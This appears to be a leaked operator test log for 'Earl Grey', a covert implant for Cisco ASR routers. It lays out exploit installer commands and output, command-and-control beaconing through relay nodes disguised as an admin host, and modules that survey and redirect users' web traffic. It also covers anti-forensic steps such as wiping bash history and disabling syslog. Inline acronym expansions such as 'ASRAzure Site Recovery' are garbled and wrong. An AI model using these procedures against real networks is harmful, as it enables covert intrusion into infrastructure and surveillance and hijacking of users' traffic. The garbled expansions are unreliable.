@@ -1,0 +1,981 @@
+
+                        Owner: User #1179928
+Earl Grey Testing
+CONOP:
+Using two Flux nodes between ICON and the target for obfuscation; establish install path from admin host in target network coming from telnet port 23. Once installed, SNMPSimple Network Management Protocol trigger will come through the admin box as well and the target ASRAzure Site Recovery will beacon back from a random high port to the web host which has a forth Flux node installed on it that is bridging port 8080 to port 8080 in the flux tunnel.
+ 
+Summary:
+
+10/14 - Initial install test completed. Trigger sent and received back from implanted ASR
+10/19 - Install/comms through Flux tunnel testing
+10/20 - Sucessfully installed EGEarl Grey (Project name) on the target through the 3 Flux nodes appearing to originate from an admin workstation. Also successfully configured Flux/EG so that EGEarl Grey (Project name) would beacon back through an Internet connected Web host to pass the beacon back through the Flux tunnel.
+Made new EGEarl Grey (Project name) implant with operational type settings with operator's input: Using 2 Flux nodes for obfuscation and 2 Flux nodes inside the target network for the gateway and return beacon. Successfully able to send SNMPSimple Network Management Protocol trigger appearing to come from admin host and the target successfully beaconing back from a random high port to 8080 on the web host.
+Tested survey module with 500 second time duration on XX.XX.X.X (HURRICANE-9[US])/24 subnet
+10/21 - Tested various survey options
+10/22 - Installed additional Cisco access switch off of Office network segment and created two VMVirtual Machine hosts for this segment to use in testing
+10/26 - Various survey testing, now with 800ms latency on flux nodes. Verified that source or dest on survey could only be as large as a /16 subnet. However, if the source and dest are both the host range, that it will survey all websites that the hosts visit due to the logic in the survey results.
+10/27 - Various redir testing with 800ms latency on flux nodes. Unable to get redir to go from inside web server to outside Internet address. Pcap sent...
+10/28 - Confirmed that Slurp-Slurp works successfully to uninstall when "sh tech" issues on the target. Tried reinstalling with delay set to 1200ms and it failed consistently.
+10/29 - Install will succeed with delay of 1000ms, but takes approximately 30 minutes to complete.
+Confirmed that v1.0.2 fixes the redirect bug. Redirection does take nearly 3 minutes to successfully redirect once the command succeeds on target.
+Survey and redirection rules work at 2000ms delay. Also able to pull back survey results at 2000ms delay.
+
+
+11/1 - 11/13 - Various Ixia stress testingConfirmed that EGEarl Grey (Project name) was able to redir all Ixia traffic destined for the internal webhost without any "punch through"
+
+12/7 - Received EA 1.0.4
+12/8-11 RP failover and stress testing
+12/17 Initial install on target op with 1.0.4 notes -> need update and further testing on FP failover on version 1.0.5
+12/21 Installing with various username / password / enable secrect combinations of putting passwords in quotes to simulate what will be done on target
+12/29 Received 1.0.5 - testing various scenarios in which the FP (ESP) card fails over to the standby card
+1/5 - 1/7 Various FP failover scenarios, IOSApple operating system for small devices upgrade scenarios, and scenario to re-create the state at which the target is in right now having last uninstalled v1.0.4 and installing new with v1.0.5
+1/28 Received 1.0.6 - This release gives greater flexibility in surveying interesting hosts on the network as well as reformatting the survey report. Will test various scenarios that will be likely in the target environment.
+
+
+ 
+Ops Notes:
+
+Flux node running on target webserver needs to bridge port 8080 to port 8080 to receive the callback and send back through the Flux tunnel.
+Flux gateway should be set to admin host: XX.XX.X.X (HURRICANE-9[US])
+
+Sugguest running "Show redundancy switchover history" prior to install to better characterize how often target switches management cards (EGEarl Grey (Project name) does not survive an RP switchover)
+Install duration is about one minute, 15 seconds with 2ms delay in lab network
+Install duration at 1000ms delay is approximately 25 minutes. If the latency to target is greater than 1000ms, the installation will likely fail.
+Install with delay at 1200ms consistantly fails.
+Health checks, module commands, and retrieving survey files are all consistantly successful with delay up to 2000ms.
+Avoid installing on target if there is a user logged in via telnet on a vty line. Installation may fail if users are occupying the vty lines or done within 30 minutes of an RP failover.If install does fail with the message: "get prompt failed", wait at least 30 minutes after you're sure no users are actively using console or vty lines as they target is configured to expire these lines after 30 minutes.
+
+If the target ASRAzure Site Recovery has an FP failover during the time that a redirection module is active, the redirection will stop, yet will still show as running when performing a health check
+If the target ASRAzure Site Recovery has an FP failover during a survey module, the module will show as running for the duration that it was set for. However, it will return blank survey results
+Command examples (See EGEarl Grey (Project name) userguide for syntax explanations):
+
+Install:root@debian:/home/user1/release# python earlgrey_installer.py XX.XX.X.XX (HURRICANE-9[US]) cisco cisco password ASR-1006 ./test_log c2_manager  clear_exp_history
+
+
+Health check:root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -n
+
+
+Redirect rule upload:root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -r "sip=XX.XX.X.X (HURRICANE-9[US])\16,dip=100.100.40.3,dprt=80,rip=100.100.40.4,p=3,time=1200,l=redir_module"
+
+
+Survey rule upload:
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -s "sip=XX.XX.X.X (HURRICANE-9[US])\24,dip=XX.XX.X.X (HURRICANE-9[US])\24,dprt=80,p=3,fields=11111,time=1200,l=survey_module"
+Survey file retrieval:
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -a l=./survey.log
+root@debian:/home/user1/release# python read_survey.py -c survey.log > websuvey.cvs
+
+
+
+Stop module:root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -f
+
+
+Uninstall:
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -x
+
+
+
+
+Observables:
+
+Wireshark shows SNMPSimple Network Management Protocol packet with source of flux gateway with dest of XX.XX.X.XX (HURRICANE-9[US]) with C2 comms. The SNMPSimple Network Management Protocol community listed in the packet is "public".
+If a trigger is sent to the target IP XX.XX.X.XX (HURRICANE-9[US]) when it is not implanted or the install failed, an SNMPSimple Network Management Protocol trap gets recorded on the SNMPSimple Network Management Protocol server.
+
+
+ 
+Testing Notes:
+EG-1.0.0
+
+On Earl-Grey build VM, login with eg_build / eg_build (su - 10sne1)
+Edit /home/eg-build/Earl_Grey_v1.0.0/common/config.h
+vi config.h 
+
+LP_HOST1 "X.X.X.XX (LVLT-GOGL-8-8-8[US])"
+LP_HOST2 "X.X.X.XX (LVLT-GOGL-8-8-8[US])"
+LP_HOST3 "127.0.0.1"
+
+
+
+
+cd /home/eg-build/Earl_Grey_v1.0.0/build/release/cd ../../..
+
+make clean release
+ls -l ./build/release/
+
+
+From ICON1 (Move build from eg-build VMVirtual Machine to ICON1 VMVirtual Machine)
+root@debian:/etc# scp -r root@172.20.12.105:/home/eg-build/Earl_Grey_v1.0.0/build/release /home/user1
+root@debian:/home/user1/release# python earlgrey_installer.py XXX.XX.XXX.XX (ORACLE-AT[US]) cisco cisco password ASR-1006 ./test_log c2_manager clear_exp_history 
+
+Receive the following output:== Exploit version 30502 ==[+] Generating random names for the c2 and clear sip history binaries c2_manager is now wdotiutq (9191b039896bd7c12ec984288a300a2b) clear_exp_history is now aswulpmp (8652da573ae103299f6c12b14c874bd7)[+] wdotiutq.tar.gz size: 34131 bytes[+] aswulpmp.tar.gz size: 2256 bytes[+] Logging into ASR-1006 as 'cisco@XXX.XX.XXX.XX (ORACLE-AT[US])' via telnet[+] Escalating privileges[+] Dropping down into SIPSession Initiation Protocol (Internet Telephony) consoleException during our attempt to get the SIPSession Initiation Protocol (Internet Telephony) console: Timeout exceeded.<expect_telnet.expectlogtelnet object at 0x7fc0929dce10>version: 3.2command: /usr/bin/telnetargs: ['/usr/bin/telnet', 'XXX.XX.XXX.XX (ORACLE-AT[US])']searcher: <pexpect.searcher_re object at 0x7fc0929dce50>buffer (last 100 chars): '0\r\nEnter interface cpu to connect to: 0\r\n%Slot 0 does not support IPCInterprocess Communications console to CPU 0.\r\n\r\nASR-1006#'before (last 100 chars): '0\r\nEnter interface cpu to connect to: 0\r\n%Slot 0 does not support IPCInterprocess Communications console to CPU 0.\r\n\r\nASR-1006#'after: <class 'pexpect.TIMEOUT'>match: Nonematch_index: Noneexitstatus: Noneflag_eof: Falsepid: 12367child_fd: 3closed: Falsetimeout: 30delimiter: <class 'pexpect.EOF'>logfile: <open file '././test_log', mode 'w+' at 0x7fc0929e5a50>logfile_read: Nonelogfile_send: Nonemaxread: 2000ignorecase: Falsesearchwindowsize: Nonedelaybeforesend: 0.05delayafterclose: 0.1delayafterterminate: 0.1
+
+Spoke to Will at the Bakery on the install failure above. They had me run the following on our ASR:
+ASR-1006#ipc-conEnter interface slot to connect to: 0Enter interface cpu to connect to: 0%Slot 0 does not support IPCInterprocess Communications console to CPU 0.
+This seems to indicate that there is an issue with config/hardware that will NOT allow the EGEarl Grey (Project name) implant to install
+Waiting for callback from User #?  (0931 10/9)
+
+
+After speaking with User #73295, it was determined that since I do not have a SPA interface card in slot 0/0, this delivery will not work with the current hardware configuration.
+I removed the 5x1Gig SPA card from slot 0/2 and put it into 0/0 and was able to do a "ipc-con" "0 0" via the IOS
+
+
+From ICON1
+root@debian:/etc# scp -r root@172.20.12.105:/home/eg-build/Earl_Grey_v1.0.0/build/release /home/user1
+
+root@debian:/home/user1/release# python earlgrey_installer.py XXX.XX.XXX.XX (ORACLE-AT[US]) cisco cisco password ASR-1006 ./test_log c2_manager clear_exp_history 
+
+Received the following output after the installer was stuck and hung for approximately 30 minutes== Exploit version 30502 ==[+] Generating random names for the c2 and clear sip history binaries c2_manager is now iyucoycj (9191b039896bd7c12ec984288a300a2b) clear_exp_history is now tlohvidm (8652da573ae103299f6c12b14c874bd7)[+] iyucoycj.tar.gz size: 34131 bytes[+] tlohvidm.tar.gz size: 2259 bytes[+] Logging into ASR-1006 as 'cisco@XXX.XX.XXX.XX (ORACLE-AT[US])' via telnet[+] Escalating privileges[+] Dropping down into SIPSession Initiation Protocol (Internet Telephony) console[+] Computing offsets for writing into SIPSession Initiation Protocol (Internet Telephony) memory^CTraceback (most recent call last): File "earlgrey_installer.py", line 639, in <module> if sip_writer.findWriteOffet(expect) == False: File "earlgrey_installer.py", line 30, in findWriteOffet expect.sendcommand('term length 0', sendline = True, waitforprompt=True) File "/home/user1/release/expect_telnet.py", line 75, in sendcommand return self.getprompt(sendline = sendline, timeout = timeout) File "/home/user1/release/expect_telnet.py", line 68, in getprompt self.drain() File "/home/user1/release/expect_telnet.py", line 62, in drain r = self.expect([".*", pexpect.TIMEOUT, pexpect.EOF], timeout = .1) File "/usr/lib/python2.7/dist-packages/pexpect/__init__.py", line 1417, in expect return self.expect_list(compiled_pattern_list,
+
+Restarted ASRAzure Site Recovery to try again....same result as previous.
+
+
+
+
+dw_checker.py
+Using "-i" option in Makefiles to ignore matches from the dirty word checker.  Appears that the result of this is that if matches are found compilation will continue along, forcing user to look through make scrollback to see if there were any dirty word hits of concern.  They probably did this to get around false positive matches, but the result that it is very likely that legitimate matches will be missed ==> open defect
+
+When running "make clean all", see the following:
+
+python ../../utilities/dw_checker.py -m -i -d ../../utilities/dirtywords.txt c2_managerdw_checker hit on 1 dirty words
+Results:-------- 1) Match: lab Context: '{ sleep 3; echo "cp /tmp/sw/fp/0/0/fp/mount/etc/lablogin.sh /etc/; /bin/sh -c '(sleep 6; rm -rf /root/.bash_history)&'"; sleep 3; echo "exit"; } | telnet fp-active'
+
+lablogin.sh is part of IOS-XE - kicks off internal file copying from the active RP; c2_manager uses it to push files 
+
+
+Candidates for dwlist.txt; these are present in debug builds, so we should make sure they don't appear in release builds
+gdb(server) - may be required: "bexec.sh -c 'gdbserver 10.0.2.0:4545 --attach `pidof cpp_cp_svr`; exit;' -t 10.0.2.0 > /dev/null &"
+collect(ion)
+hook
+payload
+trigger
+(de)(en)crypt
+replay
+encrytion (misspelling in the debug build)
+
+
+
+
+
+EG-1.0.1 (New Release to fix SIPSession Initiation Protocol (Internet Telephony) interface position and Python 2.7 issues)
+
+On Earl-Grey build VM, login with eg_build / eg_build (su - 10sne1)
+Edit /home/eg-build/earl_grey_v1.0.1/common/config.h
+vi config.h 
+
+LP_HOST1 "X.X.X.XX (LVLT-GOGL-8-8-8[US])"
+LP_HOST2 "X.X.X.XX (LVLT-GOGL-8-8-8[US])"
+LP_HOST3 "127.0.0.1"
+
+
+
+
+cd /home/eg-build/earl_grey_v1.0.0/build/release/cd ../../..
+
+make clean release
+ls -l ./build/release/
+
+
+From ICON1 (Move build from eg-build VMVirtual Machine to ICON1 VMVirtual Machine)
+Without changing any modules: Interface card in SIPSession Initiation Protocol (Internet Telephony) 0/0, 0/1, 0/3 (none in SIPSession Initiation Protocol (Internet Telephony) 0/2)
+root@debian:/home/user1# scp -rp root@172.20.12.105:/home/eg-build/earl-grey-1.0.1/earl-grey-1.0.1/build/release /home/user1
+root@debian:/home/user1/release# python earlgrey_installer.py XXX.XX.XXX.XX (ORACLE-AT[US]) cisco cisco password ASR-1006 ./test_log c2_manager clear_exp_history 
+
+Receive error that there is no SIPSession Initiation Protocol (Internet Telephony) module in 0/2:
+== Exploit version 30502 ==[+] Generating random names for the c2 and clear sip history binaries c2_manager is now ogucnlyg (572f41612aa50255925b319f6345eb0d) clear_exp_history is now ommnqpmj (2d05ac51d0cbe6d7f822e4bd13b7ff38)[+] ogucnlyg.tar.gz size: 34143 bytes[+] ommnqpmj.tar.gz size: 2267 bytes[+] Logging into ASR-1006 as 'cisco@XXX.XX.XXX.XX (ORACLE-AT[US])' via telnet[+] Escalating privileges[+] Dropping down into SIPSession Initiation Protocol (Internet Telephony) consoleException during our attempt to get the SIPSession Initiation Protocol (Internet Telephony) console: Timeout exceeded in read_nonblocking().<expect_telnet.expectlogtelnet object at 0x7f10f09e2990>version: 2.3 ($Revision: 399 $)command: /usr/bin/telnetargs: ['/usr/bin/telnet', 'XXX.XX.XXX.XX (ORACLE-AT[US])']searcher: searcher_re: 0: re.compile("session")buffer (last 100 chars): 0Enter interface cpu to connect to: 2%Slot 0 does not support IPCInterprocess Communications console to CPU 2.
+ASR-1006#before (last 100 chars): 0Enter interface cpu to connect to: 2%Slot 0 does not support IPCInterprocess Communications console to CPU 2.
+ASR-1006#after: <class 'pexpect.TIMEOUT'>match: Nonematch_index: Noneexitstatus: Noneflag_eof: Falsepid: 18874child_fd: 3closed: Falsetimeout: 30delimiter: <class 'pexpect.EOF'>logfile: <open file '././test_log', mode 'w+' at 0x7f10f09f6810>logfile_read: Nonelogfile_send: Nonemaxread: 2000ignorecase: Falsesearchwindowsize: Nonedelaybeforesend: 0.05delayafterclose: 0.1delayafterterminate: 0.1
+
+
+Moved 5x1G SPA card into SIPSession Initiation Protocol (Internet Telephony) 0/2 and ran installer again:
+
+root@debian:/home/user1/release# python earlgrey_installer.py XXX.XX.XXX.XX (ORACLE-AT[US]) cisco cisco password ASR-1006 ./test_log c2_manager clear_exp_history Received the following output:== Exploit version 30502 ==[+] Generating random names for the c2 and clear sip history binaries c2_manager is now qkbthkef (572f41612aa50255925b319f6345eb0d) clear_exp_history is now ndkfoznh (2d05ac51d0cbe6d7f822e4bd13b7ff38)[+] qkbthkef.tar.gz size: 34141 bytes[+] ndkfoznh.tar.gz size: 2267 bytes[+] Logging into ASR-1006 as 'cisco@XXX.XX.XXX.XX (ORACLE-AT[US])' via telnet[+] Escalating privileges[+] Dropping down into SIPSession Initiation Protocol (Internet Telephony) console[+] Computing offsets for writing into SIPSession Initiation Protocol (Internet Telephony) memory[+] Write location: 0x31244FD0[+] Uploading and executing sh code to overwrite .sh files--- Upload 100% complete ---[+] Getting root terminal on RP activeGet prompt failed
+
+
+
+
+Met with The Bakery to troubleshoot (10/14)
+
+After some troubleshooting on the target ASR1006, it was determined that a hard drive must be installed in the management card for the exploit to install on target.
+Powered down ASR, inserted hard drive, and started ASRAzure Site Recovery back up.
+Attacked ASRAzure Site Recovery previous commands from ICON1
+
+root@debian:/home/user1/release# python earlgrey_installer.py XXX.XX.XXX.XX (ORACLE-AT[US]) cisco cisco password ASR-1006 ./test_log c2_manager clear_exp_history == Exploit version 30502 ==[+] Generating random names for the c2 and clear sip history binaries c2_manager is now wflgxgob (572f41612aa50255925b319f6345eb0d) clear_exp_history is now yihjukqc (2d05ac51d0cbe6d7f822e4bd13b7ff38)[+] wflgxgob.tar.gz size: 34140 bytes[+] yihjukqc.tar.gz size: 2264 bytes[+] Logging into ASR-1006 as 'cisco@XXX.XX.XXX.XX (ORACLE-AT[US])' via telnet[+] Escalating privileges[+] Dropping down into SIPSession Initiation Protocol (Internet Telephony) console[+] Computing offsets for writing into SIPSession Initiation Protocol (Internet Telephony) memory[+] Write location: 0x31248FD0[+] Uploading and executing sh code to overwrite .sh files--- Upload 100% complete ---[+] Getting root terminal on RP active[+] Uploading wflgxgob.tar.gz to the RP--- Upload 100% complete ---[+] Decompressing the c2 package[+] md5sum /tmp/wflgxgob: 572f41612aa50255925b319f6345eb0d[+] Executing wflgxgob[+] Getting root terminal on SIP[+] Uploading yihjukqc.tar.gz to the SIP--- Upload 100% complete ---[+] Decompressing the cleanup package[+] md5sum /tmp/yihjukqc: 2d05ac51d0cbe6d7f822e4bd13b7ff38[+] Executing yihjukqc[+] Cleaning up files on SIP[+] Getting a terminal on FP[+] Disabling syslog messages from the FP[+] Cleaning up files on RP-active[+] Exploit completed successfully
+
+Copied "release" folder from the eg-builder VMVirtual Machine to ICON2
+Ran the daemon on the LPListening Post (ICON2): root@debian:/home/user1/release# ./lp_daemon
+
+From ICON1, ran the following test trigger: root@debian:/home/user1/release# ./lp -T XXX.XX.XXX.XX (ORACLE-AT[US]) -D X.X.X.XX (LVLT-GOGL-8-8-8[US]) -nUsing default port, 4444, to connect to server daemonImplant Health Status: Uptime: 1313 seconds Redir: Not Running Survey: Not Running
+
+
+10/19 - Test install through Flux tunnel
+
+Created IP access list on ASR1006, Ten 0/3/0.4 to block traffic from host X.X.X.XX (LVLT-GOGL-8-8-8[US]) to XX.XX.X.XX (HURRICANE-9[US]). This will ensure that ICON1 cannot directly attack the ASRAzure Site Recovery interface and that the source IP must appear to be coming from the Admin/FLX1 workstation.
+Configured two Flux nodes between ICON and the target network and they show in the Flux GUIGraphical User Interface on my ICON box.
+Configured Flux on "Web" and "Host1" in target network and they are showing as two spokes in the Flux GUIGraphical User Interface on ICON.
+Configured the Flux gateway to be that of Host1(Admin/FLX1) so that source traffic going to ASRAzure Site Recovery will appear to come from this workstation from ICON.
+Configured bridge in Flux GUIGraphical User Interface to bridge port 8080 that the beacon will call back on to port 4444 which is configured in the LP_Daemon listener.
+Made a new 
+(With ASRAzure Site Recovery previously restarted) Ran attack from ICON:
+root@debian:/home/user1/release# python earlgrey_installer.py XX.XX.X.XX (HURRICANE-9[US]) cisco cisco password ASR-1006 ./test_log101 c2_manager clear_exp_history
+.......
+[+] Exploit completed successfully
+
+
+Tried to do a health check to the implant via:root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -D XX.XX.X.XXX (HURRICANE-9[US]) -P 8080 -nFailed to receive enough HELLO data.
+
+
+Created a bridge in Flux to bridge the LP_Default_Implant_Port 6001 to port 6001 to pass the beacon back to ICON1
+Bridging other ports to 6001 was not successful in combination with the trigger syntax above.
+
+
+Successfully sent trigger and received beacon back through the web host:
+
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -nUsing loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonImplant Health Status: Uptime: 71194 seconds Redir: Not Running Survey: Not Running
+Successfully seeing SNMPSimple Network Management Protocol packet on Flux gateway which is the administrator workstation (as expected).
+TCPDump on the Webhost shows comms coming from the target over default port 23 (telnet) to the destination port of 6001Spoke with operator about this issue and he would prefer a random high port. I then changed the config.h file for future build so that the beacon port is "0" so that it will choose an ephemeral port
+
+Sent uninstall command: root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -xUsing loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonImplant Health Status: Uptime: 77344 seconds Redir: Not Running Survey: Not Running
+
+Sending health status again hangs as the implant successfully uninstalled.
+
+
+On Builder: Did a "make clean release" with the following config.h:
+ CLIENT_LOCAL_BEACON_PORT set to "0" so that it would chose a high port
+LP_DEFAULT_IMPLANT_PORT 8080      // Port to beacon back to web host
+LP_HOST1 "XX.XX.X.XXX (HURRICANE-9[US])"                 // web host
+
+
+From ICON1: (Reinstall; beacon back through web:8080)scp -rp root@172.20.12.105:/home/eg-build/earl-grey-1.0.1/earl-grey-1.0.1/build/release /home/user1
+
+Made a bridge on Flux web host to bridge 8080 > 8080 to send the beacon back through the tunnel to ICON Desktop
+root@debian:/home/user1/release# python earlgrey_installer.py XX.XX.X.XX (HURRICANE-9[US]) cisco cisco password ASR-1006 ./test_log101 c2_manager clear_exp_history
+Start ./lp_daemon in seperate window on ICON1
+
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -nUsing loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonImplant Health Status: Uptime: 162 seconds Redir: Not Running Survey: Not Running
+
+Wireshark on admin box shows SNMPSimple Network Management Protocol get request to target XX.XX.X.XX (HURRICANE-9[US])
+TCPDump on web host shows random high ports going to 8080 on web host
+(Repeated serveral times to confirm random ports being used and that comms are successfull)
+
+
+
+Survey module test:
+
+
+Started SEEDS on admin host workstation and started survey on target from ICON1:
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -s "sip=XX.XX.X.X (HURRICANE-9[US])\24,dip=XX.XX.X.X (HURRICANE-9[US])\24,dprt=53,p=3,fields=11111,time=500,l=survey_module"Using loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonSource IP: 0x41310000Source Mask: 0xffffff00Dest IP: 0x41310000Dest Mask: 0xffffff00Dest Port: 53Protocol: 3Field specifiers: 0x1fEnabled Time: 500Local filepath: survey_moduleImplant Health Status: Uptime: 4916 seconds Redir: Not Running Survey: Not Runningsurvey_module-modifi 100% |*****************************| 3388 B Success
+
+
+Health check during survey:
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -nUsing loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonImplant Health Status: Uptime: 5217 seconds Redir: Not Running Survey: Running Source IP: 0x41310000 Source Mask: 0xffffff00 Dest IP: 0x41310000 Dest Mask: 0xffffff00 Dest Port: 53 Field Specifiers: 0x1f Enabled Time: 500
+
+
+Health check after survey time expires:root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -nUsing loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonImplant Health Status: Uptime: 6252 seconds Redir: Not Running Survey: Not Running
+
+
+Recover/read survey file from target:
+
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -a l=./survey.logUsing loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonLocal filepath: ./survey.logImplant Health Status: Uptime: 68031 seconds Redir: Not Running Survey: Not Runningfile 100% |*****************************| 44 B Success
+Read_survey.py fails since it is not on the ICON1 box. It must be copied over manually from the build VM:
+scp -rp root@172.20.12.105:/home/eg-build/earl-grey-1.0.1/earl-grey-1.0.1/utilities/read_survey.py /home/user1/release
+
+root@debian:/home/user1/release# python read_survey.py -c survey.logSurvey Start:,Tue Oct 20 17:43:18 2015Survey End:,Tue Oct 20 17:51:42 2015Number of Collisions:,0Survey Configuration:Src. IP,Src. Mask,Dst. IP,Dst. Mask,Dst. Port,Protocol,Fields,Enabled Time (s)XX.XX.X.X (HURRICANE-9[US]),255.255.255.0,XX.XX.X.X (HURRICANE-9[US]),255.255.255.0,53,BOTH,0b11111,500
+Survey Data:Src. IP,Port,Dst. IP,Port,Count,Bytes,Protocol
+
+=No CSVcomma-separated values (Spreadsheet file format) file... guessing that perhaps I didn't collect anything? Running new survey...
+
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -s "sip=XX.XX.X.X (HURRICANE-9[US])\24,dip=100.100.40.0\24,dprt=443,p=3,fields=11111,time=500,l=survey_module"
+
+Tried health check while survey was runing, but web and admin flux nodes went down and I was unable to trigger for a health check
+Got flux network back up and running correctly and was able to complete a health check indicating all was well and that the survey was done
+
+
+ Sent trigger to download survey.log: root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -a l=./survey.log
+Tried to read survey.log again and did not create a CSVcomma-separated values (Spreadsheet file format) file in my /release directory.
+Ran another survey to collect on port 80: root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -s "sip=XX.XX.X.X (HURRICANE-9[US])\24,dip=100.100.40.0\24,dprt=80,p=3,fields=11111,time=800,l=survey_module"
+From seed host and DNSDomain Name System server, browsed to 100.100.40.3 - 4 using http
+
+Survey completed and survey_module file pulled back to ICON1.
+
+root@debian:/home/user1/release# python read_survey.py -c survey.log > websurvey.csv
+Created websurvey.csv file and was able to view it on LibreOffice Calc
+Asked User #73294/User #73295 why the results seem to switch the source/destination IP's.... he advised that was the logic requested of them based on how surveys are normally done. He will follow up to confirm how it's supposed to look.
+
+User #73294 called back and advised that the IP with the lower port would be the "source" IP and the IP with the higher port would be the "dest" IP.
+
+
+
+
+
+10/22 - Installed additional switch; Created two hosts on Office Network, updated seeds scripts on both sides to wget for more web addresses outside the test network and to the inside Web host (Spoke with operator who said he will mostly survey for port 80 traffic to find users to redirect to Windex)
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -s "sip=XX.XX.X.X (HURRICANE-9[US])\16,dip=100.100.40.0\24,dprt=80,p=3,fields=11111,time=800,l=survey_module"
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -a l=./survey.log
+root@debian:/home/user1/release# python read_survey.py -c survey.log > websurvey2.csv
+Opened websurvey2.csv and saw expected results with multiple connections from various seeds hosts out to the two destination IP's on port 80.
+
+
+
+10/26 - Attempt to survey from XX.XX.X.X (HURRICANE-9[US])/16 to any address on port 80
+
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -s "sip=XX.XX.X.X (HURRICANE-9[US])\16,dip=0.0.0.0\0,dprt=80,p=3,fields=11111,time=800,l=survey_module"
+Using loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonSource IP: 0x41310000Source Mask: 0xffff0000IP mask must be between 16-32.Invalid value in 'dip'
+
+
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -s "sip=XX.XX.X.X (HURRICANE-9[US])\16,dip=XX.XX.X.X (HURRICANE-9[US])\16,dprt=80,p=3,fields=11111,time=800,l=survey_module"Using loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonSource IP: 0x41310000Source Mask: 0xffff0000Dest IP: 0x41310000Dest Mask: 0xffff0000Dest Port: 80Protocol: 3Field specifiers: 0x1fEnabled Time: 800Local filepath: survey_moduleImplant Health Status: Uptime: 506469 seconds Redir: Not Running Survey: Not Runningsurvey_module-modifi 100% |*****************************| 3388 B Success
+The product of this syntax survey is that information is collected for any source or destination of XX.XX.X.X (HURRICANE-9[US])/16. Therefore, I see collection for any Internet destination going back to internal hosts on the target's internal network. This overall logic seems confusing as a user, but the above synatx will get the desired results.
+
+
+
+
+Survey conducted with 800ms of delay on Flux nodes: (Survey command/trigger on ICON1 seemed noticeably slower, but completed successfully)
+
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -s "sip=XX.XX.X.X (HURRICANE-9[US])\16,dip=XX.XX.X.X (HURRICANE-9[US])\16,dprt=80,p=3,fields=11111,time=800,l=survey_module"Using loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonSource IP: 0x41310000Source Mask: 0xffff0000Dest IP: 0x41310000Dest Mask: 0xffff0000Dest Port: 80Protocol: 3Field specifiers: 0x1fEnabled Time: 800Local filepath: survey_moduleImplant Health Status: Uptime: 512203 seconds Redir: Not Running Survey: Not Runningsurvey_module-modifi 100% |*****************************| 3388 B Success
+Survey completes and pulls back sucessfully. Survey .csv file output looks fine.
+
+
+
+10/27 - Redir module testing with 800ms of delay on Flux nodes
+
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -r "sip=XX.XX.X.X (HURRICANE-9[US])\16,dip=100.100.40.3,dprt=80,rip=100.100.40.4,p=3,time=600,l=redir_module"Using loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonSource IP: 0x41310000Source Mask: 0xffff0000Dest IP: 0x64642803Dest Port: 80Redir IP: 0x64642804Protocol: 3Enabled Time: 600Local filepath: redir_moduleImplant Health Status: Uptime: 586506 seconds Redir: Not Running Survey: Not Runningredir_module-modifie 100% |*****************************| 1680 B Success
+
+From .7 seed host, cleared browser cache and went to 100.100.40.3 and was served the 100.100.40.4 page as expected. (As a side note, when trying to browse directly to 100.100.40.4, it would not load while modeule was active)
+Once 600 second timer expired, original 100.100.40.3 page was served as  expected.
+
+
+Ran the same survey again for 1200 seconds = upload successful
+Tried to upload same redir module while the original was running and the upload failed.
+Browsed to 100.100.40.3 from seed host and was served 100.100.40.4 as expected again.
+
+
+Flushed module before it was finished running: 
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -fUsing loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonImplant Health Status: Uptime: 589230 seconds Redir: Running Source IP: 0x41310000 Source Mask: 0xffff0000 Dest IP: 0x64642803 Redir IP: 0x64642804 Dest Port: 80 Enabled Time: 1200 Survey: Not Running
+Wait 2 minutes for module to shut down, then run health check:
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -nUsing loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonImplant Health Status: Uptime: 589302 seconds Redir: Not Running Survey: Not Running
+
+
+
+Simulate operational scenario where outside customer browses to ISP webpage and is redirected to an outside web server
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -r "sip=XX.XX.X.X (HURRICANE-9[US])\24,dip=XX.XX.X.XXX (HURRICANE-9[US]),dprt=80,rip=100.100.40.3,p=3,time=1200,l=redir_module"
